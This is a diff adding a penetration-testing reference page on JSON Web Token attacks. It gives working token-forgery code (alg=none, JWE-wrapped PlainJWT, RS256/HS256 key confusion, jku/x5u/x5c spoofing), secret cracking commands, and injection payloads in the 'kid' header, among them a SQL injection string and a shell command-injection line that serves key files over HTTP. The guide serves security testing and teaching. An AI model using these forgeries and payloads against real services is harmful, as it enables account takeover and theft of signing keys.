@@ -1,0 +1,433 @@
+# JWT Vulnerabilities (JSON Web Tokens)
+
+{{#include ../banners/hacktricks-training.md}}
+
+Part of this page is based on the [**jwt_tool attack methodology**](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology).<sup>[[3]](#references)</sup> The same author maintains [**jwt_tool**](https://github.com/ticarpi/jwt_tool) for JWT assessment.
+
+### **Quick Wins**
+
+Run [**jwt_tool**](https://github.com/ticarpi/jwt_tool) with mode `All Tests!` and wait for green lines
+
+```bash
+python3 jwt_tool.py -M at \
+    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
+    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
+```
+
+If you are lucky the tool will find some case where the web application is incorrectly checking the JWT:
+
+![JWT Vulnerabilities (Json Web Tokens) - Quick Wins: If you are lucky the tool will find some case where the web application is incorrectly checking the JWT](<../images/image (935).png>)
+
+Then, you can search the request in your proxy or dump the used JWT for that request using jwt\_ tool:
+
+```bash
+python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
+```
+
+You can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) to launch JWT attacks from Burp.
+
+### Practical JWT assessment workflow
+
+- **Scope the session control**: Pick a user-specific request (e.g., profile, billing). Remove cookies/headers one at a time until the request is rejected to isolate which token(s) actually gate authorization.
+- **Locate JWTs in traffic**: They often sit in `Authorization: Bearer <JWT>`, but also appear in custom headers or cookies. If Burp doesn’t highlight them, use Target → Site map → Engagement tools → Search with regex patterns such as:
+  - `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
+  - `eyJ[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+`
+  - `[= ]eyJ[A-Za-z0-9_\\/+-]*\.[A-Za-z0-9._\\/+-]*`
+- **Decode and enumerate**: Use Burp **JWT Editor** or `python3 jwt_tool.py <JWT>` to read header/payload. Note `alg`, `exp`/token lifetime, and authn/authz-driving claims (`role`, `id`, `username`, `email`, etc.).
+- **Signature enforcement sanity check**: Flip or delete a few bytes in the signature portion and replay. Acceptance implies missing signature validation and you can directly tamper payload claims.
+- **Goal**: Modify payload claims to escalate privileges; every attack below aims to get the server to accept a tampered payload by abusing weak verification, weak secrets, or unsafe key selection.<sup>[[4]](#references)</sup>
+
+### Tamper data without modifying anything
+
+You can just tamper with the data leaving the signature as is and check if the server is checking the signature. Try to change your username to "admin" for example.
+
+#### **Is the token checked?**
+
+To check if a JWT's signature is being verified:
+
+- An error message suggests ongoing verification; sensitive details in verbose errors should be reviewed.
+- A change in the returned page also indicates verification.
+- No change suggests no verification; this is when to experiment with tampering payload claims.
+
+### Origin
+
+It's important to determine whether the token was generated server-side or client-side by examining the proxy's request history.
+
+- Tokens first seen from the client side suggest the key might be exposed to client-side code, necessitating further investigation.
+- Tokens originating server-side indicate a secure process.
+
+### Duration
+
+Check whether the token lasts more than 24 hours or never expires. If it contains an `exp` field, verify that the server enforces it correctly.
+
+### Brute-force HMAC secret
+
+[**See this page.**](../generic-hacking/brute-force.md#jwt)
+
+If the header uses **HS256**, dump the token to a file and try offline cracking:
+
+```bash
+python3 jwt_tool.py <JWT> -C -d wordlist.txt
+hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+Once the secret is recovered, load it as a symmetric key in Burp JWT Editor and re-sign modified claims.<sup>[[4]](#references)</sup>
+
+### Derive JWT secrets from leaked config + DB data
+
+If an arbitrary file read (or backup leak) exposes both **application encryption material** and **user records**, you can sometimes recreate the JWT signing secret and forge session cookies without knowing any plaintext passwords. Example pattern observed in workflow automation stacks:<sup>[[1]](#references)</sup>
+
+1. Leak the app key (e.g., `encryptionKey`) from a config file.
+2. Leak the user table to obtain `email`, `password_hash`, and `user_id`.
+3. Derive the signing secret from the key, then derive the per-user hash expected in the JWT payload:
+
+```python
+jwt_secret = sha256(encryption_key[::2]).hexdigest()              # signing key
+jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]
+token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
+```
+
+4. Drop the signed token into the session cookie (e.g., `n8n-auth`) to impersonate the user/admin account even if the password hash is salted.
+
+### Modify the algorithm to None
+
+Set the algorithm used as "None" and remove the signature part.
+
+Use the Burp extension call "JSON Web Token" to try this vulnerability and to change different values inside the JWT (send the request to Repeater and in the "JSON Web Token" tab you can modify the values of the token. You can also select to put the value of the "Alg" field to "None").
+
+### JWE-wrapped PlainJWT / public-key auth bypass (pac4j-jwt CVE-2026-29000)
+
+Some stacks expect a **signed inner JWT** wrapped inside an **encrypted JWE**. In vulnerable `pac4j-jwt` versions (before `4.5.9`, `5.7.9`, and `6.3.3`), the authenticator decrypts the JWE, tries to parse the payload as a signed JWT, and only verifies the signature if that conversion succeeds. If the decrypted payload is a **PlainJWT** (`alg=none`), `toSignedJWT()` returns `null` and the signature verification path is skipped.<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>
+
+- **Pre-reqs**:
+  - The application accepts **JWE bearer tokens**
+  - The server public key is exposed (commonly via **JWKS** such as `/.well-known/jwks.json` or `/api/auth/jwks`)
+  - Authorization depends on attacker-controlled claims such as `sub`, `role`, `groups`, or `scope`
+- **Impact**: forge an encrypted token for any user/role using **only the public key**
+
+Practical checks:
+
+- Enumerate the frontend / API docs for clues such as `RSA-OAEP-256`, `A128GCM`/`A256GCM`, `jwks`, or comments saying "inner JWT is signed".
+- Fetch the JWKS and import the RSA key from `n`/`e`.
+- Build the inner token manually as `base64url(header) + "." + base64url(payload) + "."` so the signature is empty.
+- Encrypt that plaintext JWT as a JWE using the exposed public key and replay it as the bearer token.
+
+Minimal PlainJWT construction:
+
+```python
+header = {"alg": "none"}
+claims = {"sub": "admin", "role": "ROLE_ADMIN", "iss": "target"}
+b64 = lambda b: base64.urlsafe_b64encode(b).decode().rstrip("=")
+plain = (
+    f"{b64(json.dumps(header, separators=(',', ':')).encode())}."
+    f"{b64(json.dumps(claims, separators=(',', ':')).encode())}."
+)
+```
+
+Encrypt it into a compact JWE with the RSA public key from JWKS:
+
+```python
+rsa_key = jwk.JWK(**jwks["keys"][0])
+token = jwe.JWE(
+    plaintext=plain.encode(),
+    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A256GCM"}),
+    recipient=rsa_key,
+)
+forged = token.serialize(compact=True)
+```
+
+Notes:
+
+- If your JWT library refuses to emit `alg=none`, generate the compact token manually as shown above.
+- The `enc` value must match one accepted by the target; frontend comments and legitimate tokens often disclose this.
+- In SPAs, check whether the bearer token is stored in `sessionStorage`, `localStorage`, or a JS-accessible cookie; dropping the forged token there is often enough to validate the bypass quickly.
+
+### Change the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)
+
+The algorithm HS256 uses the secret key to sign and verify each message.\
+The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.
+
+If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.
+
+Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:
+
+```bash
+openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
+openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
+```
+
+Using Burp **JWT Editor**, import the RSA public key (from `/.well-known/jwks.json` or a PEM) and run **Attack → HMAC Key Confusion Attack** to automate the HS256 re-sign attempt.<sup>[[4]](#references)</sup>
+
+#### Passive triage for RS256→HS256 confusion in PAN-OS / GlobalProtect CAS (CVE-2026-0265)
+
+A practical real-world pattern is a verifier that normally expects **RS256** tokens from an external identity service, but still honors attacker-controlled `alg=HS256` and treats the fetched **RSA public key bytes** as the HMAC secret. In that situation, anyone who can recover the public key can mint valid HS256 tokens.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>
+
+For **Palo Alto PAN-OS / GlobalProtect** with **Cloud Authentication Service (CAS)** attached to the authentication profile, the exposed GlobalProtect prelogin flow gives enough unauthenticated data to do a **safe passive triage** without forging a token.
+
+1. Request the anonymous prelogin endpoint:
+
+```http
+GET /global-protect/prelogin.esp HTTP/1.1
+Host: <target>
+```
+
+2. Parse the XML response:
+- `<cas-auth>yes</cas-auth>` means the vulnerable CAS-backed verification path is reachable.
+- If `cas-auth` is `no`, empty, or absent, treat the result as **not vulnerable or inconclusive** rather than guessing. Missing fields commonly mean mTLS, client-version/User-Agent gating, or that the host is not really a GlobalProtect portal.
+
+3. Recover the PAN-OS build from the embedded JWT inside `<saml-request>`:
+- Base64-decode `<saml-request>` to recover the auto-submit HTML form.
+- Extract the hidden `Token` value (`HEADER.PAYLOAD.SIGNATURE`).
+- Base64url-decode `PAYLOAD` and read the `PanOSversion` claim.
+- Treat a trailing `.saas` suffix as **cloud-managed / not affected** for this case.
+
+Minimal extraction flow:
+
+```bash
+curl -sk 'https://<target>/global-protect/prelogin.esp' > prelogin.xml
+python3 - <<'EOF'
+import base64, html, json, re
+xml = open('prelogin.xml', 'r', encoding='utf-8', errors='ignore').read()
+cas = re.search(r'<cas-auth>(.*?)</cas-auth>', xml, re.S)
+print('cas-auth =', cas.group(1).strip() if cas else 'missing')
+enc = re.search(r'<saml-request>(.*?)</saml-request>', xml, re.S)
+if enc:
+    form = base64.b64decode(html.unescape(enc.group(1))).decode('utf-8', 'ignore')
+    token = re.search(r'name="Token"\s+value="([^"]+)"', form)
+    if token:
+        payload = token.group(1).split('.')[1]
+        payload += '=' * (-len(payload) % 4)
+        claims = json.loads(base64.urlsafe_b64decode(payload))
+        print('PanOSversion =', claims.get('PanOSversion'))
+        print('SN =', claims.get('SN'))
+        print('TID =', claims.get('TID'))
+EOF
+```
+
+4. Compare the extracted version against the vendor hotfix matrix instead of relying on banners or TLS metadata. Examples from the PAN-OS advisory:
+- `11.1.6-h32` → fixed for base `11.1.6`
+- `11.1.6-h23` → vulnerable
+- `11.2.7-h9` → vulnerable because the fixed hotfix is `h13`
+- `11.1.15` → fixed base release
+
+Other assessment notes:
+- The same external SSO path, `/SAML20/SP/ACS`, can terminate in **different privileged backends** depending on the listener. On GlobalProtect it leads to the VPN login flow; on the management interface it leads to administrator authentication. Always map shared SSO paths to every backend they can reach.
+- The decoded prelogin JWT may also leak useful posture data such as the appliance serial number (`SN`), tenant identifier (`TID`), callback URL, and CAS region endpoint.
+- The official mitigation is to **pin the expected algorithm server-side** and reject HMAC verification when the supplied key material is an asymmetric public key / PEM blob.
+
+### New public key inside the header
+
+An attacker embeds a new key in the header of the token and the server uses this new key to verify the signature (CVE-2018-0114).
+
+This can be done with the "JSON Web Tokens" Burp extension.\
+(Send the request to the Repeater, inside the JSON Web Token tab select "CVE-2018-0114" and send the request).
+
+### JWKS Spoofing
+
+The instructions detail a method to assess the security of JWT tokens, particularly those employing a "jku" header claim. This claim should link to a JWKS (JSON Web Key Set) file that contains the public key necessary for the token's verification.
+
+- **Assessing Tokens with "jku" Header**:
+  - Verify the "jku" claim's URL to ensure it leads to the appropriate JWKS file.
+  - Modify the token's "jku" value to direct towards a controlled web service, allowing traffic observation.
+- **Monitoring for HTTP Interaction**:
+  - Observing HTTP requests to your specified URL indicates the server's attempts to fetch keys from your provided link.
+  - When employing `jwt_tool` for this process, it's crucial to update the `jwtconf.ini` file with your personal JWKS location to facilitate the testing.
+- **Command for `jwt_tool`**:
+
+  - Execute the following command to simulate the scenario with `jwt_tool`:
+
+    ```bash
+    python3 jwt_tool.py JWT_HERE -X s
+    ```
+
+### Kid Issues Overview
+
+An optional header claim known as `kid` is utilized for identifying a specific key, which becomes particularly vital in environments where multiple keys exist for token signature verification. This claim assists in selecting the appropriate key to verify a token's signature.
+
+#### Revealing Key through "kid"
+
+When the `kid` claim is present in the header, it's advised to search the web directory for the corresponding file or its variations. For instance, if `"kid":"key/12345"` is specified, the files _/key/12345_ and _/key/12345.pem_ should be searched for in the web root.
+
+#### Path Traversal with "kid"
+
+The `kid` claim might also be exploited to navigate through the file system, potentially allowing the selection of an arbitrary file. It's feasible to test for connectivity or execute Server-Side Request Forgery (SSRF) attacks by altering the `kid` value to target specific files or services. Tampering with the JWT to change the `kid` value while retaining the original signature can be achieved using the `-T` flag in jwt_tool, as demonstrated below:
+
+```bash
+python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
+```
+
+By targeting files with predictable content, it's possible to forge a valid JWT. For instance, the `/proc/sys/kernel/randomize_va_space` file in Linux systems, known to contain the value **2**, can be used in the `kid` parameter with **2** as the symmetric password for JWT generation.
+
+A practical pattern for brittle file-system key loading is to generate an HS256 key with JWK `k` set to `AA==`, set `kid` to a traversal like `../../../../../../../dev/null`, and re-sign—some implementations treat the empty file as a valid HMAC secret and will accept forged tokens.<sup>[[4]](#references)</sup>
+
+#### SQL Injection via "kid"
+
+If the `kid` claim's content is employed to fetch a password from a database, an SQL injection could be facilitated by modifying the `kid` payload. An example payload that uses SQL injection to alter the JWT signing process includes:
+
+`non-existent-index' UNION SELECT 'ATTACKER';-- -`
+
+This alteration forces the use of a known secret key, `ATTACKER`, for JWT signing.
+
+#### OS Injection through "kid"
+
+A scenario where the `kid` parameter specifies a file path used within a command execution context could lead to Remote Code Execution (RCE) vulnerabilities. By injecting commands into the `kid` parameter, it's possible to expose private keys. An example payload for achieving RCE and key exposure is:
+
+`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`
+
+### x5u and jku
+
+#### jku
+
+jku stands for **JWK Set URL**.\
+If the token uses a “**jku**” **Header** claim then **check out the provided URL**. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.
+
+First you need to create a new certificate with new private & public keys
+
+```bash
+openssl genrsa -out keypair.pem 2048
+openssl rsa -in keypair.pem -pubout -out publickey.crt
+openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
+```
+
+Then you can use for example [**jwt.io**](https://jwt.io) to create the new JWT with the **created public and private keys and pointing the parameter jku to the certificate created.** In order to create a valid jku certificate you can download the original one anche change the needed parameters.
+
+You can obtain the parametes "e" and "n" from a public certificate using:
+
+```bash
+from Crypto.PublicKey import RSA
+fp = open("publickey.crt", "r")
+key = RSA.importKey(fp.read())
+fp.close()
+print("n:", hex(key.n))
+print("e:", hex(key.e))
+```
+
+If the verifier fetches key material remotely, embed a Burp Collaborator URL in `jku`/`x5u` using **JWT Editor → Attack → Embed Collaborator payload**. Any callback confirms SSRF-style key retrieval; then host your own JWKS/PEM at that URL and re-sign with your private key so the service validates attacker-minted tokens.<sup>[[4]](#references)</sup>
+
+#### x5u
+
+X.509 URL. A URI pointing to a set of X.509 (a certificate format standard) public certificates encoded in PEM form. The first certificate in the set must be the one used to sign this JWT. The subsequent certificates each sign the previous one, thus completing the certificate chain. X.509 is defined in RFC 52807 . Transport security is required to transfer the certificates.
+
+Try to **change this header to an URL under your control** and check if any request is received. In that case you **could tamper the JWT**.
+
+To forge a new token using a certificate controlled by you, you need to create the certificate and extract the public and private keys:
+
+```bash
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
+openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
+```
+
+Then you can use for example [**jwt.io**](https://jwt.io) to create the new JWT with the **created public and private keys and pointing the parameter x5u to the certificate .crt created.**
+
+![jku - x5u: Then you can use for example jwt.io to create the new JWT with the created public and private keys and pointing the parameter x5u to the certificate .crt created](<../images/image (956).png>)
+
+You can also abuse both of these vulns **for SSRFs**.
+
+#### x5c
+
+This parameter may contain the **certificate in base64**:
+
+![x5u - x5c: This parameter may contain the certificate in base64](<../images/image (1119).png>)
+
+If the attacker **generates a self-signed certificate** and creates a forged token using the corresponding private key and replace the "x5c" parameter’s value with the newly generatedcertificate and modifies the other parameters, namely n, e and x5t then essentially the forgedtoken would get accepted by the server.
+
+```bash
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
+openssl x509 -in attacker.crt -text
+```
+
+### Embedded Public Key (CVE-2018-0114)
+
+If the JWT has embedded a public key like in the following scenario:
+
+![x5c - Embedded Public Key (CVE-2018-0114): If the JWT has embedded a public key like in the following scenario](<../images/image (624).png>)
+
+Using the following nodejs script it's possible to generate a public key from that data:
+
+```bash
+const NodeRSA = require('node-rsa');
+const fs = require('fs');
+n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
+e = "AQAB";
+const key = new NodeRSA();
+var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
+console.log(importedKey.exportKey("public"));
+```
+
+It's possible to generate a new private/public key, embeded the new public key inside the token and use it to generate a new signature:
+
+```bash
+openssl genrsa -out keypair.pem 2048
+openssl rsa -in keypair.pem -pubout -out publickey.crt
+openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
+```
+
+You can obtain the "n" and "e" using this nodejs script:
+
+```bash
+const NodeRSA = require('node-rsa');
+const fs = require('fs');
+keyPair = fs.readFileSync("keypair.pem");
+const key = new NodeRSA(keyPair);
+const publicComponents = key.exportKey('components-public');
+console.log('Parameter n: ', publicComponents.n.toString("hex"));
+console.log('Parameter e: ', publicComponents.e.toString(16));
+```
+
+Finally, using the public and private key and the new "n" and "e" values you can use [jwt.io](https://jwt.io) to forge a new valid JWT with any information.
+
+### ES256: Revealing the private key with same nonce
+
+If an application uses ES256 but reuses the same nonce to generate two JWTs, the private key can be recovered.
+
+See this [ECDSA nonce-reuse example with secp256k1](https://asecuritysite.com/encryption/ecd5).
+
+### JTI (JWT ID)
+
+The JTI (JWT ID) claim provides a unique identifier for a JWT Token. It can be used to prevent the token from being replayed.\
+However, if the maximum ID space is four decimal digits (`0001`–`9999`), requests 0001 and 10001 may reuse the same ID. If the back end increments the ID on each request, an attacker may be able to **replay a request** after forcing 10,000 intervening requests.
+
+### JWT Registered claims
+
+
+{{#ref}}
+https://www.iana.org/assignments/jwt/jwt.xhtml#claims
+{{#endref}}
+
+### Other attacks
+
+**Cross-service Relay Attacks**
+
+It has been observed that some web applications rely on a trusted JWT service for the generation and management of their tokens. Instances have been recorded where a token, generated for one client by the JWT service, was accepted by another client of the same JWT service. If the issuance or renewal of a JWT via a third-party service is observed, the possibility of signing up for an account on another client of that service using the same username/email should be investigated. An attempt should then be made to replay the obtained token in a request to the target to see if it is accepted.
+
+- A critical issue may be indicated by the acceptance of your token, potentially allowing the spoofing of any user's account. However, it should be noted that permission for wider testing might be required if signing up on a third-party application, as this could enter a legal grey area.
+
+**Expiry Check of Tokens**
+
+The token's expiry is checked using the "exp" Payload claim. Given that JWTs are often employed without session information, careful handling is required. In many instances, capturing and replaying another user's JWT could enable impersonation of that user. The JWT RFC recommends mitigating JWT replay attacks by utilizing the "exp" claim to set an expiry time for the token. Furthermore, the implementation of relevant checks by the application to ensure the processing of this value and the rejection of expired tokens is crucial. If the token includes an "exp" claim and testing time limits allow, storing the token and replaying it after the expiry time has passed is advised. The content of the token, including timestamp parsing and expiry checking (timestamp in UTC), can be read using the jwt_tool's -R flag.
+
+- A security risk may be present if the application still validates the token, as it may imply that the token could never expire.
+
+### Tools
+
+- [jwt_tool](https://github.com/ticarpi/jwt_tool) – decoding, claim/header tampering, offline secret cracking (`-C`) and semi-automated attack modes (`-M at`).
+- [Burp JWT Editor](https://github.com/PortSwigger/jwt-editor) – decode/re-sign in Repeater, generate custom keys, and run built-in attacks (**none**, **HMAC key confusion**, **embedded JWK**, **jku/x5u collaborator payloads**).<sup>[[2]](#references)</sup>
+- [hashcat](https://hashcat.net/hashcat/) `-m 16500` – GPU-accelerated HS256 secret cracking after exporting JWTs to a wordlist.<sup>[[4]](#references)</sup>
+
+
+{{#ref}}
+https://github.com/ticarpi/jwt_tool
+{{#endref}}
+
+## References
+
+- [1] [n8n token forge chain – config+DB leak to JWT signing secret](https://github.com/Chocapikk/CVE-2026-21858)
+- [2] [Burp Suite – JWT Editor extension](https://github.com/PortSwigger/jwt-editor)
+- [3] [jwt_tool attack methodology](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
+- [4] [Keys to JWT Assessments – TrustedSec](https://trustedsec.com/blog/keys-to-jwt-assessments-from-a-cheat-sheet-to-a-deep-dive)
+- [5] [0xdf - HTB: Principal](https://0xdf.gitlab.io/2026/03/30/htb-principal.html)
+- [6] [CodeAnt AI - Inside CVE-2026-29000: The pac4j JWT Authentication Bypass Explained](https://www.codeant.ai/blogs/pac4j-vulnerability-cve-2026-29000)
+- [7] [Bishop Fox - Detecting CVE-2026-0265 at Scale: PAN-OS CAS Authentication Bypass](https://bishopfox.com/blog/detecting-cve-2026-0265-at-scale-pan-os-cas-authentication-bypass)
+- [8] [Palo Alto Networks Advisory - CVE-2026-0265 PAN-OS: Authentication Bypass with Cloud Authentication Service (CAS) enabled](https://security.paloaltonetworks.com/CVE-2026-0265)
+
+{{#include ../banners/hacktricks-training.md}}
